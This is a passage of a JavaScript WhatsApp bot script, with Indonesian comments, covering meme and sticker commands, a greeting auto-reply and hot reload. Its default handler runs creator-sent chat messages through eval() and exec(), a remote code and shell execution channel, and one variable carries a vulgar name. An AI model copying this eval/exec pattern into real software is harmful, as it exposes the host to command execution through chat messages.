        let bawah = teks[1] ? teks[1] : atas // Jika teks bawah tidak ada, gunakan teks atas dan abaikan teks atas

        // Jika hanya ada satu teks, abaikan teks atas
        if (teks.length === 1) {
            atas = '-'
            bawah = teks[0]
        }

        // Mengunduh dan menyimpan gambar yang diberikan
        let mee = await zynX.downloadAndSaveMediaMessage(quoted)

        // Mengunggah gambar ke TelegraPh
        let mem = await TelegraPh(mee)

        // Membuat URL meme dengan teks dan gambar latar belakang yang diunggah
        let meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`

        // Mengirim gambar sebagai stiker
        let memek = await zynX.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })

    } else {
        reply(`Send/reply image with caption ${prefix + command} Zʏɴxᴢᴏ`)
    }
}
    break

case 'sticker': case 's': case 'stickergif': case 'sgif': {
 if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
await loading()
let media = await quoted.download()
let encmedia = await zynX.sendImageAsStickerAV(from, media, fcall, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await zynX.sendVideoAsSticker(from, media, fcall, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break

default:
if (budy.startsWith('=>')) {
if (!isCreator) return false
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return reply(bang)}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return false
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
await reply(String(err))}}
if (budy.startsWith('$')) {
if(!isCreator) return false
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)})}

if ((budy.match) && ["Assalamualaikum", "assalamualaikum", "Assalamu'alaikum",].includes(budy) && !isCmd) {
reply(`*Waalaikummussalam warahmatullahi wabarokatuh*\n\n\n_📚 Baca yang dibawah ya!_
"Orang yang mengucapkan salam seperti ini maka ia mendapatkan 30 pahala, kemudian, orang yang dihadapan atau mendengarnya membalas dengan kalimat yang sama yaitu “Wa'alaikum salam warahmatullahi wabarakatuh atau ditambah dengan yang lain (waridhwaana). Artinya selain daripada do'a selamat juga meminta pada Allah SWT`)
}
if (isCmd && budy.toLowerCase() != undefined) {
if (from.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
zynX.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
